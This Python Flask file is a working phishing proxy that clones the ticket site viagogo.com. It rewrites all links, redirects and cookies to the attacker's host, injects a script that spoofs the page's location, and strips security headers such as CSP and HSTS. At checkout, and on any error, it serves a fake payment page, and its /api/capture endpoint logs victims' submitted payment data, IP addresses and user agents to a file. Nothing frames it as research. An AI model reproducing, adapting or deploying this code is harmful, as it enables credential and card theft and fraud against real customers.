from flask import Flask, request, Response, render_template
import requests
import re
from urllib.parse import urljoin
import threading
import time
import os

app = Flask(__name__)

TARGET_DOMAIN = "www.viagogo.com"
TARGET_SCHEME = "https"
CHECKOUT_TRIGGER = "/checkout/payment"
EXTERNAL_HOST = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "localhost")

EXCLUDED_REQUEST_HEADERS = [
    'host', 'origin', 'referer', 'x-forwarded-for',
    'x-forwarded-proto', 'x-forwarded-host', 'x-forwarded-port',
    'x-real-ip', 'cf-connecting-ip', 'true-client-ip'
]

EXCLUDED_RESPONSE_HEADERS = [
    'content-encoding', 'content-length', 'transfer-encoding',
    'connection', 'strict-transport-security',
    'content-security-policy', 'content-security-policy-report-only',
    'x-content-type-options', 'x-frame-options',
    'x-xss-protection', 'set-cookie'
]

STATIC_EXTENSIONS = (
    '.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.ico',
    '.css', '.js', '.woff', '.woff2', '.ttf', '.eot',
    '.mp4', '.webm', '.mp3', '.map', '.json'
)

BLOCK_PATHS = [
    '/api/capture',
    '/static/',
]

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                  '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,'
              'image/webp,image/apng,*/*;q=0.8',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
})

session_adapter = requests.adapters.HTTPAdapter(
    pool_connections=10,
    pool_maxsize=10,
    max_retries=2,
    pool_block=False
)
session.mount('https://', session_adapter)

def should_rewrite_body(content_type):
    if not content_type:
        return False
    ct = content_type.lower()
    return any(t in ct for t in ['text/html', 'text/css', 'javascript', 'application/json', 'text/plain'])

def rewrite_html(content):
    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')

    replacements = [
        ('https://www.viagogo.com', 'https://' + EXTERNAL_HOST),
        ('https://viagogo.com', 'https://' + EXTERNAL_HOST),
        ('http://www.viagogo.com', 'https://' + EXTERNAL_HOST),
        ('http://viagogo.com', 'https://' + EXTERNAL_HOST),
        ('//www.viagogo.com', '//' + EXTERNAL_HOST),
    ]

    for old, new in replacements:
        content_str = content_str.replace(old, new)

    content_str = re.sub(
        r'(https?://)?api\.viagogo\.com',
        'https://' + EXTERNAL_HOST,
        content_str
    )
    content_str = re.sub(
        r'(https?://)?myaccount\.viagogo\.com',
        'https://' + EXTERNAL_HOST,
        content_str
    )
    content_str = re.sub(
        r'(https?://)?checkout\.viagogo\.com',
        'https://' + EXTERNAL_HOST,
        content_str
    )

    content_str = re.sub(
        r'window\.location\.href\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
        f'window.location.href = "https://{EXTERNAL_HOST}"',
        content_str
    )
    content_str = re.sub(
        r'window\.location\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
        f'window.location = "https://{EXTERNAL_HOST}"',
        content_str
    )
    content_str = re.sub(
        r'location\.href\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
        f'location.href = "https://{EXTERNAL_HOST}"',
        content_str
    )
    content_str = re.sub(
        r'document\.location\s*=\s*["\']https?://(?:www\.)?viagogo\.com',
        f'document.location = "https://{EXTERNAL_HOST}"',
        content_str
    )
    content_str = re.sub(
        r'location\.replace\(["\']https?://(?:www\.)?viagogo\.com',
        f'location.replace("https://{EXTERNAL_HOST}"',
        content_str
    )
    content_str = re.sub(
        r'location\.assign\(["\']https?://(?:www\.)?viagogo\.com',
        f'location.assign("https://{EXTERNAL_HOST}"',
        content_str
    )

    inject_script = '''
    <script>
    (function() {
        var originalLocation = window.location;
        var fakeOrigin = "https://''' + EXTERNAL_HOST + '''";
        var handler = {
            get: function(target, prop) {
                if (prop === 'origin') return fakeOrigin;
                if (prop === 'host') return "''' + EXTERNAL_HOST + '''";
                if (prop === 'hostname') return "''' + EXTERNAL_HOST + '''";
                if (prop === 'protocol') return "https:";
                if (prop === 'href') return fakeOrigin + target.pathname + target.search + target.hash;
                return Reflect.get(target, prop);
            },
            set: function(target, prop, value) {
                if (prop === 'href' || prop === 'assign' || prop === 'replace') {
                    if (typeof value === 'string' && value.indexOf('viagogo.com') !== -1) {
                        value = value.replace(/https?:\\/\\/(www\\.)?viagogo\\.com/g, fakeOrigin);
                    }
                    return Reflect.set(target, prop, value);
                }
                return Reflect.set(target, prop, value);
            }
        };
        window.location = new Proxy(originalLocation, handler);
    })();
    </script>
    '''

    head_close_pos = content_str.find('</head>')
    if head_close_pos != -1:
        content_str = content_str[:head_close_pos] + inject_script + content_str[head_close_pos:]

    return content_str.encode('utf-8')

def rewrite_css(content):
    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
    content_str = re.sub(
        r'url\(["\']?(https?://)?(?:www\.)?viagogo\.com',
        f'url(https://{EXTERNAL_HOST}',
        content_str
    )
    content_str = re.sub(
        r'url\(["\']?(https?://)?(?:www\.)?viagogo\.com',
        f'url(https://{EXTERNAL_HOST}',
        content_str
    )
    return content_str.encode('utf-8')

def rewrite_js(content):
    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
    content_str = content_str.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
    content_str = content_str.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
    content_str = content_str.replace('http://www.viagogo.com', 'https://' + EXTERNAL_HOST)
    content_str = content_str.replace('http://viagogo.com', 'https://' + EXTERNAL_HOST)
    content_str = content_str.replace('//www.viagogo.com', '//' + EXTERNAL_HOST)
    content_str = re.sub(
        r'["\'](/api/[^"\']*)["\']',
        rf'"https://{EXTERNAL_HOST}\1"',
        content_str
    )
    return content_str.encode('utf-8')

def rewrite_json(content):
    content_str = content if isinstance(content, str) else content.decode('utf-8', errors='ignore')
    content_str = content_str.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
    content_str = content_str.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
    return content_str.encode('utf-8')

@app.route('/api/capture', methods=['POST'])
def capture_payment():
    import json
    import datetime
    data = request.get_json(force=True, silent=True)
    timestamp = datetime.datetime.utcnow().isoformat()
    log_entry = {
        'timestamp': timestamp,
        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
        'user_agent': request.headers.get('User-Agent', ''),
        'data': data
    }
    print(f"[CAPTURE] {json.dumps(log_entry)}")
    try:
        with open('/tmp/captured_payments.log', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        print(f"[ERROR] Failed to write log: {e}")
    return {'status': 'ok', 'message': 'Payment processing'}, 200

@app.route('/static/fake_payment.html')
def serve_fake_payment():
    return render_template('fake_payment.html', host=EXTERNAL_HOST)

@app.route('/health')
def health():
    return {'status': 'ok', 'host': EXTERNAL_HOST}, 200

@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD'])
def proxy(path):
    if path.startswith('static/') or path == 'api/capture':
        if path == 'api/capture' and request.method == 'POST':
            return capture_payment()
        return app.send_static_file(path) if path.startswith('static/') else ('', 404)

    if CHECKOUT_TRIGGER in request.path or path.endswith('/checkout/payment') or '/checkout/payment?' in request.path:
        return render_template('fake_payment.html', host=EXTERNAL_HOST)

    target_url = f"{TARGET_SCHEME}://{TARGET_DOMAIN}/{path}"
    if request.query_string:
        query_str = request.query_string.decode('utf-8') if isinstance(request.query_string, bytes) else request.query_string
        target_url += f"?{query_str}"

    headers = {}
    for key, value in request.headers.items():
        if key.lower() not in EXCLUDED_REQUEST_HEADERS:
            headers[key] = value

    headers['Host'] = TARGET_DOMAIN
    headers['Origin'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}'
    headers['Referer'] = f'{TARGET_SCHEME}://{TARGET_DOMAIN}/'
    headers['Accept-Encoding'] = 'gzip, deflate'

    if 'cookie' in headers:
        headers['cookie'] = re.sub(r'domain=\.?viagogo\.com', '', headers['cookie'])

    try:
        resp = session.request(
            method=request.method,
            url=target_url,
            headers=headers,
            data=request.get_data(),
            cookies=request.cookies,
            allow_redirects=False,
            timeout=25,
            verify=True
        )
    except requests.exceptions.Timeout:
        return render_template('fake_payment.html', host=EXTERNAL_HOST), 200
    except requests.exceptions.ConnectionError as e:
        return f'Proxy connection error: {str(e)[:200]}', 502
    except Exception as e:
        return f'Proxy error: {str(e)[:200]}', 502

    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get('Location', '')
        if location:
            location = location.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
            location = location.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
            location = location.replace('http://www.viagogo.com', 'https://' + EXTERNAL_HOST)
            location = location.replace('http://viagogo.com', 'https://' + EXTERNAL_HOST)
        from flask import redirect as flask_redirect
        response = flask_redirect(location, code=resp.status_code)
        return response

    content_type = resp.headers.get('Content-Type', '')
    content = resp.content

    if should_rewrite_body(content_type):
        if 'text/html' in content_type:
            content = rewrite_html(content)
        elif 'text/css' in content_type:
            content = rewrite_css(content)
        elif 'javascript' in content_type:
            content = rewrite_js(content)
        elif 'application/json' in content_type:
            content = rewrite_json(content)
        else:
            content = content.replace(
                b'https://www.viagogo.com',
                ('https://' + EXTERNAL_HOST).encode('utf-8')
            )

    proxy_response = Response(content, status=resp.status_code)

    for key, value in resp.headers.items():
        key_lower = key.lower()
        if key_lower in EXCLUDED_RESPONSE_HEADERS:
            continue
        if key_lower == 'location':
            value = value.replace('https://www.viagogo.com', 'https://' + EXTERNAL_HOST)
            value = value.replace('https://viagogo.com', 'https://' + EXTERNAL_HOST)
        if key_lower == 'set-cookie':
            value = re.sub(r'Domain=\.?viagogo\.com', f'Domain={EXTERNAL_HOST}', value, flags=re.IGNORECASE)
            value = re.sub(r';\s*Secure', '', value, flags=re.IGNORECASE)
        proxy_response.headers[key] = value

    proxy_response.headers['X-Proxy'] = 'viagogo-mirror'
    return proxy_response

@app.errorhandler(404)
def not_found(e):
    return render_template('fake_payment.html', host=EXTERNAL_HOST), 200

@app.errorhandler(500)
def server_error(e):
    return render_template('fake_payment.html', host=EXTERNAL_HOST), 200

def keep_alive():
    while True:
        time.sleep(600)
        try:
            requests.get(f'https://{EXTERNAL_HOST}/health', timeout=10)
        except:
            pass

if __name__ == '__main__':
    if os.environ.get('RENDER') != 'true':
        threading.Thread(target=keep_alive, daemon=True).start()
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
